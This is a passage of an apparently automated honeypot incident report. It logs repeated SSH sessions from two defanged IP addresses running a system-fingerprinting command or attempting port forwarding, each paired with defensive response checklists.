| `2026-08-15 07:05:40` | `cowrie.client.version` |
| `2026-08-15 07:05:40` | `cowrie.client.kex` |
| `2026-08-15 07:05:41` | `cowrie.login.success` |
| `2026-08-15 07:05:42` | `cowrie.session.params` |
| `2026-08-15 07:05:42` | `cowrie.command.input` |
| `2026-08-15 07:05:42` | `cowrie.log.closed` |
| `2026-08-15 07:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0433fa7c0b23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:45` | `cowrie.session.connect` |
| `2026-08-15 07:05:46` | `cowrie.client.version` |
| `2026-08-15 07:05:46` | `cowrie.client.kex` |
| `2026-08-15 07:05:47` | `cowrie.login.success` |
| `2026-08-15 07:05:48` | `cowrie.session.params` |
| `2026-08-15 07:05:48` | `cowrie.command.input` |
| `2026-08-15 07:05:49` | `cowrie.log.closed` |
| `2026-08-15 07:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfd49b05284

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:51` | `cowrie.session.connect` |
| `2026-08-15 07:05:51` | `cowrie.client.version` |
| `2026-08-15 07:05:51` | `cowrie.client.kex` |
| `2026-08-15 07:05:53` | `cowrie.login.success` |
| `2026-08-15 07:05:53` | `cowrie.session.params` |
| `2026-08-15 07:05:53` | `cowrie.command.input` |
| `2026-08-15 07:05:54` | `cowrie.log.closed` |
| `2026-08-15 07:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56ad6b161b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:56` | `cowrie.session.connect` |
| `2026-08-15 07:05:57` | `cowrie.client.version` |
| `2026-08-15 07:05:57` | `cowrie.client.kex` |
| `2026-08-15 07:05:59` | `cowrie.login.success` |
| `2026-08-15 07:06:00` | `cowrie.session.params` |
| `2026-08-15 07:06:00` | `cowrie.command.input` |
| `2026-08-15 07:06:01` | `cowrie.log.closed` |
| `2026-08-15 07:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c301ea3887a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:02` | `cowrie.session.connect` |
| `2026-08-15 07:06:02` | `cowrie.client.version` |
| `2026-08-15 07:06:02` | `cowrie.client.kex` |
| `2026-08-15 07:06:04` | `cowrie.login.success` |
| `2026-08-15 07:06:05` | `cowrie.session.params` |
| `2026-08-15 07:06:05` | `cowrie.command.input` |
| `2026-08-15 07:06:05` | `cowrie.log.closed` |
| `2026-08-15 07:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29fb052ec953

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:08` | `cowrie.session.connect` |
| `2026-08-15 07:06:08` | `cowrie.client.version` |
| `2026-08-15 07:06:08` | `cowrie.client.kex` |
| `2026-08-15 07:06:09` | `cowrie.login.success` |
| `2026-08-15 07:06:10` | `cowrie.session.params` |
| `2026-08-15 07:06:10` | `cowrie.command.input` |
| `2026-08-15 07:06:10` | `cowrie.log.closed` |
| `2026-08-15 07:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccf86b88907

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:14` | `cowrie.session.connect` |
| `2026-08-15 07:06:14` | `cowrie.client.version` |
| `2026-08-15 07:06:14` | `cowrie.client.kex` |
| `2026-08-15 07:06:14` | `cowrie.login.success` |
| `2026-08-15 07:06:16` | `cowrie.session.params` |
| `2026-08-15 07:06:16` | `cowrie.command.input` |
| `2026-08-15 07:06:16` | `cowrie.log.closed` |
| `2026-08-15 07:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a20eabc9733

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:19` | `cowrie.session.connect` |
| `2026-08-15 07:06:19` | `cowrie.client.version` |
| `2026-08-15 07:06:19` | `cowrie.client.kex` |
| `2026-08-15 07:06:20` | `cowrie.login.success` |
| `2026-08-15 07:06:21` | `cowrie.session.params` |
| `2026-08-15 07:06:21` | `cowrie.command.input` |
| `2026-08-15 07:06:21` | `cowrie.log.closed` |
| `2026-08-15 07:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3ad77e2a7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:26` | `cowrie.session.connect` |
| `2026-08-15 07:06:26` | `cowrie.client.version` |
| `2026-08-15 07:06:26` | `cowrie.client.kex` |
| `2026-08-15 07:06:28` | `cowrie.login.success` |
| `2026-08-15 07:06:29` | `cowrie.session.params` |
| `2026-08-15 07:06:29` | `cowrie.command.input` |
| `2026-08-15 07:06:29` | `cowrie.log.closed` |
| `2026-08-15 07:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcac545fc751

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:32` | `cowrie.session.connect` |
| `2026-08-15 07:06:32` | `cowrie.client.version` |
| `2026-08-15 07:06:32` | `cowrie.client.kex` |
| `2026-08-15 07:06:34` | `cowrie.login.success` |
| `2026-08-15 07:06:35` | `cowrie.session.params` |
| `2026-08-15 07:06:35` | `cowrie.command.input` |
| `2026-08-15 07:06:35` | `cowrie.log.closed` |
| `2026-08-15 07:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ded29c1055e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:38` | `cowrie.session.connect` |
| `2026-08-15 07:06:38` | `cowrie.client.version` |
| `2026-08-15 07:06:38` | `cowrie.client.kex` |
| `2026-08-15 07:06:39` | `cowrie.login.success` |
| `2026-08-15 07:06:40` | `cowrie.session.params` |
| `2026-08-15 07:06:40` | `cowrie.command.input` |
| `2026-08-15 07:06:41` | `cowrie.log.closed` |
| `2026-08-15 07:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260282524641

| Field | Detail |
|---|---|
| **Source IP** | `37.28.177[.]141` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:39` | `cowrie.session.connect` |
| `2026-08-15 07:06:40` | `cowrie.client.version` |
| `2026-08-15 07:06:40` | `cowrie.client.kex` |
| `2026-08-15 07:06:41` | `cowrie.login.success` |
| `2026-08-15 07:06:42` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.28.177[.]141` to AbuseIPDB if not already reported
- [ ] Block `37.28.177[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39791f986485

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:43` | `cowrie.session.connect` |
| `2026-08-15 07:06:43` | `cowrie.client.version` |
| `2026-08-15 07:06:43` | `cowrie.client.kex` |
| `2026-08-15 07:06:45` | `cowrie.login.success` |
| `2026-08-15 07:06:46` | `cowrie.session.params` |
| `2026-08-15 07:06:46` | `cowrie.command.input` |
| `2026-08-15 07:06:47` | `cowrie.log.closed` |
| `2026-08-15 07:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a885a3890ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:49` | `cowrie.session.connect` |
| `2026-08-15 07:06:49` | `cowrie.client.version` |
| `2026-08-15 07:06:49` | `cowrie.client.kex` |
| `2026-08-15 07:06:51` | `cowrie.login.success` |
| `2026-08-15 07:06:52` | `cowrie.session.params` |
| `2026-08-15 07:06:52` | `cowrie.command.input` |
| `2026-08-15 07:06:52` | `cowrie.log.closed` |
| `2026-08-15 07:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ce0c4ee29a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:06 |
| **Last Seen** | 2026-08-15 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:06:55` | `cowrie.session.connect` |
| `2026-08-15 07:06:55` | `cowrie.client.version` |
| `2026-08-15 07:06:55` | `cowrie.client.kex` |
| `2026-08-15 07:06:56` | `cowrie.login.success` |
| `2026-08-15 07:06:56` | `cowrie.session.params` |
| `2026-08-15 07:06:56` | `cowrie.command.input` |
| `2026-08-15 07:06:56` | `cowrie.log.closed` |
| `2026-08-15 07:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1292b2ded8a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:01` | `cowrie.session.connect` |
| `2026-08-15 07:07:02` | `cowrie.client.version` |
| `2026-08-15 07:07:02` | `cowrie.client.kex` |
| `2026-08-15 07:07:02` | `cowrie.login.success` |
| `2026-08-15 07:07:03` | `cowrie.session.params` |
| `2026-08-15 07:07:03` | `cowrie.command.input` |
| `2026-08-15 07:07:03` | `cowrie.log.closed` |
| `2026-08-15 07:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8307c842ffb4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:07` | `cowrie.session.connect` |
| `2026-08-15 07:07:07` | `cowrie.client.version` |
| `2026-08-15 07:07:07` | `cowrie.client.kex` |
| `2026-08-15 07:07:08` | `cowrie.login.success` |
| `2026-08-15 07:07:09` | `cowrie.session.params` |
| `2026-08-15 07:07:09` | `cowrie.command.input` |
| `2026-08-15 07:07:10` | `cowrie.log.closed` |
| `2026-08-15 07:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c09d2b7d311

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:13` | `cowrie.session.connect` |
| `2026-08-15 07:07:13` | `cowrie.client.version` |
| `2026-08-15 07:07:13` | `cowrie.client.kex` |
| `2026-08-15 07:07:13` | `cowrie.login.success` |
| `2026-08-15 07:07:14` | `cowrie.session.params` |
| `2026-08-15 07:07:14` | `cowrie.command.input` |
| `2026-08-15 07:07:14` | `cowrie.log.closed` |
| `2026-08-15 07:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1d10226a81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:19` | `cowrie.session.connect` |
| `2026-08-15 07:07:19` | `cowrie.client.version` |
| `2026-08-15 07:07:19` | `cowrie.client.kex` |
| `2026-08-15 07:07:19` | `cowrie.login.success` |
| `2026-08-15 07:07:20` | `cowrie.session.params` |
| `2026-08-15 07:07:20` | `cowrie.command.input` |
| `2026-08-15 07:07:20` | `cowrie.log.closed` |
| `2026-08-15 07:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008dbbde6789

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:25` | `cowrie.session.connect` |
| `2026-08-15 07:07:25` | `cowrie.client.version` |
| `2026-08-15 07:07:25` | `cowrie.client.kex` |
| `2026-08-15 07:07:25` | `cowrie.login.success` |
| `2026-08-15 07:07:26` | `cowrie.session.params` |
| `2026-08-15 07:07:26` | `cowrie.command.input` |
| `2026-08-15 07:07:26` | `cowrie.log.closed` |
| `2026-08-15 07:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9616b3d2d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:31` | `cowrie.session.connect` |
| `2026-08-15 07:07:31` | `cowrie.client.version` |
| `2026-08-15 07:07:31` | `cowrie.client.kex` |
| `2026-08-15 07:07:33` | `cowrie.login.success` |
| `2026-08-15 07:07:35` | `cowrie.session.params` |
| `2026-08-15 07:07:35` | `cowrie.command.input` |
| `2026-08-15 07:07:36` | `cowrie.log.closed` |
| `2026-08-15 07:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915d03d15b81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:36` | `cowrie.session.connect` |
| `2026-08-15 07:07:37` | `cowrie.client.version` |
| `2026-08-15 07:07:37` | `cowrie.client.kex` |
| `2026-08-15 07:07:40` | `cowrie.login.success` |
| `2026-08-15 07:07:42` | `cowrie.session.params` |
| `2026-08-15 07:07:42` | `cowrie.command.input` |
| `2026-08-15 07:07:43` | `cowrie.log.closed` |
| `2026-08-15 07:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e5b8322535

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:43` | `cowrie.session.connect` |
| `2026-08-15 07:07:43` | `cowrie.client.version` |
| `2026-08-15 07:07:43` | `cowrie.client.kex` |
| `2026-08-15 07:07:45` | `cowrie.login.success` |
| `2026-08-15 07:07:46` | `cowrie.session.params` |
| `2026-08-15 07:07:46` | `cowrie.command.input` |
| `2026-08-15 07:07:46` | `cowrie.log.closed` |
| `2026-08-15 07:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ce41881a33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:48` | `cowrie.session.connect` |
| `2026-08-15 07:07:49` | `cowrie.client.version` |
| `2026-08-15 07:07:49` | `cowrie.client.kex` |
| `2026-08-15 07:07:50` | `cowrie.login.success` |
| `2026-08-15 07:07:52` | `cowrie.session.params` |
| `2026-08-15 07:07:52` | `cowrie.command.input` |
| `2026-08-15 07:07:52` | `cowrie.log.closed` |
| `2026-08-15 07:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95cde83e3490

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:54` | `cowrie.session.connect` |
| `2026-08-15 07:07:55` | `cowrie.client.version` |
| `2026-08-15 07:07:55` | `cowrie.client.kex` |
| `2026-08-15 07:07:57` | `cowrie.login.success` |
| `2026-08-15 07:07:59` | `cowrie.session.params` |
| `2026-08-15 07:07:59` | `cowrie.command.input` |
| `2026-08-15 07:07:59` | `cowrie.log.closed` |
| `2026-08-15 07:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635cff0d6b26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:07 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:07:59` | `cowrie.session.connect` |
| `2026-08-15 07:08:00` | `cowrie.client.version` |
| `2026-08-15 07:08:00` | `cowrie.client.kex` |
| `2026-08-15 07:08:02` | `cowrie.login.success` |
| `2026-08-15 07:08:04` | `cowrie.session.params` |
| `2026-08-15 07:08:04` | `cowrie.command.input` |
| `2026-08-15 07:08:05` | `cowrie.log.closed` |
| `2026-08-15 07:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7079b2e8f264

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
